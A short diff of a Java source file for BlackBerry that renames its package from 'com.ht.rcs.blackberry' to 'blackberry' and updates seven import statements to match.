@@ -6,17 +6,17 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import java.util.Vector;
 
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.interfaces.Singleton;
-import com.ht.rcs.blackberry.threadpool.TimerJob;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.event.Event;
+import blackberry.interfaces.Singleton;
+import blackberry.threadpool.TimerJob;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
